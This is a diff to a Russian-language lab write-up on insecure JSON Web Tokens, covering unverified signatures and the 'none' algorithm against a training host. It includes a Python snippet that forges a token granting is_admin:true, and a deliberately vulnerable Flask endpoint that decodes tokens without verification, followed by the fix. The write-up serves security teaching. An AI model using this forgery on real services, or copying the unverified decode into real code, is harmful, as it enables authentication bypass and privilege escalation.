@@ -1,4 +1,4 @@
-#JWT insecure (JSON Web Token) 
+# JWT insecure (JSON Web Token) 
 
 # Описание
 
@@ -12,6 +12,7 @@ JWT токен состоит из 3 частей: Header, Payload, Signature, �
 1. Unverified token problem
 2. Изменение алгоритма подписи с RS256 на HS256
 3. Возможность сбрутить secret key 
+4. Использование none signature
   
 # Условия
 
@@ -20,12 +21,87 @@ JWT токен состоит из 3 частей: Header, Payload, Signature, �
 # Детектирование
 
 
+# Unverified token problem и использование none signature
 
-# Unverified token problem
+Unverified token problem означает что отсутствует проверка подписи сервером.
 
-В качестве алгоритма подписи поддерживается None (отсутсвие подписи). Соответственно, это позволяет менять содержимое токена без каких либо последствий.
+Также в качестве алгоритма подписи поддерживается None (отсутсвие подписи). 
 
-## Эксплуатация
+Все это позволяет менять содержимое токена без каких либо последствий.
+
+## Эксплуатация (Unverified token problem)
+
+### Шаг 1
+
+Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).
+
+В session cookie сервер передает JWT токен, пример: 
+```
+session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
+```
+JWT токен:
+- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
+- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
+
+Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:
+
+- Header
+```json
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+```
+- Payload
+```json
+{
+  "username": "user",
+  "is_admin": false
+}
+```
+
+### Шаг 2
+ 
+Генерируем новый JWT токен, у которого третья часть (Signature) абсолютно любая. 
+Для этого можно использовать следующий код для Python 3
+
+```python
+import base64
+
+def b64urlencode(data):
+    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')
+
+print("%s.%s.%s" % (
+    b64urlencode("{\"typ\":\"JWT\",\"alg\":\"RS256\"}"), # Header
+    b64urlencode("{\"username\":\"user\",\"is_admin\":true}"), # Payload
+    b64urlencode("secret_signature") # Some signature, not important
+    )
+)
+```
+
+Полученный JWT токен: 
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.c2VjcmV0X3NpZ25hdHVyZQ
+```
+
+### Шаг 4
+
+Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.
+
+Исходный запрос
+
+![](img/utp_6.png)
+
+Запрос после изменения токена
+
+![](img/utp_7.png)
+
+Ответ от сервера
+
+![](img/utp_8.png)
+
+## Эксплуатация (none signature)
 
 ### Шаг 1
 
@@ -91,7 +167,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFs
 
 ### Шаг 4
 
-Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.
+Заходим на http://jwt_insecure.lab/index_3 и меняем в заголовке запроса значение session cookie на сгенерированный токен.
 
 Исходный запрос
 
@@ -143,9 +219,10 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFs
 
 ## Fix
 
-При преходе по адресу http://jwt_insecure.lab/index_1 управление передается в jwt_insecure/app/main.py в функцию index_1
+При преходе по адресу http://jwt_insecure.lab/index_1 управление передается в jwt_insecure/app/main.py в функцию index_1 (index_3)
 
 ```python
+# jwt_insecure/app/main.py
 @app.route("/index_1", methods=['GET']) 
 def index_1():
 	session = request.cookies.get('session')
@@ -163,6 +240,25 @@ def index_1():
 		result = ''
 
 	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
+
+
+@app.route("/index_3", methods=['GET'])
+def index_3():
+    session = request.cookies.get('session')
+    isLoggedIn = False
+
+    if session is not None:
+        try:
+            result = jwt.decode(session)
+            isLoggedIn = True
+
+        except Exception as err:
+            result = str(err)
+
+    else:
+        result = ''
+
+    return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
 ```
 
 Как это работает?
@@ -203,7 +299,55 @@ def index_1():
 ```
 
 В decode происходит вызов функции, в которой проверяется JWT подпись. 
-Если verify_signature равен False, то проверка подписи не производится.
+Если verify_signature равен False, то проверка подписи не производится. Таким образом возможна эксплуатация Unverified token problem.
+
+В случае когда верификая производится, происходит вызов _verify_signature
+
+```python
+    # pyjwt/jwt/api_jws.py
+    def _verify_signature(self, payload, signing_input, header, signature, key='', algorithms=None):
+    
+        alg = header.get('alg')
+
+        if algorithms is not None and alg not in algorithms:
+            raise InvalidAlgorithmError('The specified alg value is not allowed')
+
+        try:
+            alg_obj = self._algorithms[alg]
+            # вызов prepare_key для соответствуюшего класса из jwt_insecure/algorithms.py
+            key = alg_obj.prepare_key(key)
+
+            # вызов verify для соответствуюшего класса из jwt_insecure/algorithms.py
+            if not alg_obj.verify(signing_input, key, signature):
+                raise InvalidSignatureError('Signature verification failed')
+
+        except KeyError:
+            raise InvalidAlgorithmError('Algorithm not supported')
+
+```
+
+В переменной alg_obj будет экземпляр класса из jwt_insecure/algorithms.py, в данном случае NoneAlgorithm, для которого
+будут вызвыны функции prepare_key и verify
+
+```python
+    # jwt_insecure/algorithms.py
+    def prepare_key(self, key):
+        if key == '':
+            key = None
+
+        if key is not None:
+            raise InvalidKeyError('When alg = "none", key value must be None.')
+
+        return key
+    
+    # ...
+    
+    def verify(self, msg, key, sig):
+        return True
+```
+
+Как видно, основное требование к ключу - это его отсутсвие. И любой токен с алгоритмом подписи none является валидным.
+
 В результате, для того чтобы исправит данную уязвимость необходимо в jwt_insecure/app/main.py при вызове 
 jwt.decode передать параметр verify со значением True
 
